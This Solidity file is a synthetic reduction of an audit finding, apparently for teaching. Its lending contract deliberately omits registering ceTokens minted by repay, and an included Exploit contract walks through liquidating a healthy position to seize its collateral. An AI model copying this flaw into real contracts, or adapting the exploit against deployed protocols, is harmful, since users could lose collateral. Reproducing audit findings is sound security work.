// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Cedro Finance — repay mints ceTokens and forgets _addToken
    (Zokyo, 2024-03-19, AuditVault 37520)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    healthFactor only sums token ids in users[user]. repay can mint
    ceTokens for an overpayment and never pushes that id. A position
    that is healthy once those ceTokens count is still liquidated.
    The missing _addToken is the report's line (@> VULN). */

contract Coll {
    string public constant symbol = "COLL";
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) internal _allowance;

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowance[owner][spender];
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external {
        _allowance[msg.sender][spender] = amount;
    }

    function transferFrom(address from, address to, uint256 amount) external {
        require(balanceOf[from] >= amount, "coll");
        if (msg.sender != from) {
            require(_allowance[from][msg.sender] >= amount, "allowance");
            _allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract Core {
    error Healthy();

    uint256 public constant COLLATERAL_ID = 1;
    uint256 public constant CE_ID = 2;

    Coll public coll;
    mapping(address => uint256[]) internal _users;
    mapping(address => mapping(uint256 => uint256)) public balance;
    mapping(address => uint256) public debt;

    constructor(Coll _coll) {
        coll = _coll;
    }

    function listed(address user) external view returns (uint256) {
        return _users[user].length;
    }

    function listedId(address user, uint256 index) external view returns (uint256) {
        return _users[user][index];
    }

    function _addToken(address user, uint256 id) internal {
        uint256 len = _users[user].length;
        for (uint256 i; i < len; ++i) {
            if (_users[user][i] == id) return;
        }
        _users[user].push(id);
    }

    function deposit(uint256 amount) external {
        coll.transferFrom(msg.sender, address(this), amount);
        balance[msg.sender][COLLATERAL_ID] += amount;
        _addToken(msg.sender, COLLATERAL_ID);
    }

    function borrow(uint256 amount) external {
        debt[msg.sender] += amount;
    }

    function repay(uint256 payment) external virtual {
        uint256 owed = debt[msg.sender];
        uint256 pay = payment > owed ? owed : payment;
        debt[msg.sender] = owed - pay;
        uint256 excess = payment - pay;
        if (excess != 0) {
            // @> VULN: ceTokens minted by repay are not pushed onto users[user]
            balance[msg.sender][CE_ID] += excess;
        }
    }

    function healthFactor(address user) public view returns (uint256 collValue, uint256 debt_) {
        debt_ = debt[user];
        uint256 len = _users[user].length;
        for (uint256 i; i < len; ++i) {
            collValue += balance[user][_users[user][i]];
        }
    }

    /// Liquidatable when listed collateral is below debt. Unlisted ceTokens do not count.
    function liquidate(address user) external {
        (uint256 collValue, uint256 debt_) = healthFactor(user);
        if (debt_ == 0 || collValue >= debt_) revert Healthy();
        uint256 seized = balance[user][COLLATERAL_ID];
        balance[user][COLLATERAL_ID] = 0;
        coll.transferFrom(address(this), msg.sender, seized);
        debt[user] = 0;
    }
}

contract Victim {
    function approveAndDeposit(Coll coll, Core core, uint256 amount) external {
        coll.approve(address(core), amount);
        core.deposit(amount);
    }

    function borrow(Core core, uint256 amount) external {
        core.borrow(amount);
    }

    function repay(Core core, uint256 payment) external {
        core.repay(payment);
    }
}

contract Exploit {
    uint256 public constant POSTED = 100 ether;
    uint256 public constant FIRST_DEBT = 200 ether;
    uint256 public constant PAYMENT = 250 ether;
    uint256 public constant EXCESS = 50 ether;
    uint256 public constant SECOND_DEBT = 120 ether;

    Coll public coll;
    Core public core;
    Victim public victim;

    constructor() {
        coll = new Coll();
        core = new Core(coll);
        victim = new Victim();
        coll.mint(address(victim), POSTED);
        coll.mint(address(core), 0);
    }

    function run() external {
        victim.approveAndDeposit(coll, core, POSTED);
        victim.borrow(core, FIRST_DEBT);
        require(core.debt(address(victim)) == FIRST_DEBT, "debt not opened");

        victim.repay(core, PAYMENT);
        require(core.balance(address(victim), core.CE_ID()) == EXCESS, "ceTokens not minted");
        require(core.listed(address(victim)) == 1, "ceToken id was listed");
        require(core.debt(address(victim)) == 0, "first debt not cleared");

        victim.borrow(core, SECOND_DEBT);
        (uint256 seen, uint256 owed) = core.healthFactor(address(victim));
        require(seen == POSTED && owed == SECOND_DEBT, "health should ignore the 50");

        core.liquidate(address(victim));
        require(coll.balanceOf(address(this)) == POSTED, "liquidator did not seize 100");
        require(core.balance(address(victim), core.COLLATERAL_ID()) == 0, "victim kept collateral");
        require(core.balance(address(victim), core.CE_ID()) == EXCESS, "ceTokens still sit off the list");
    }
}
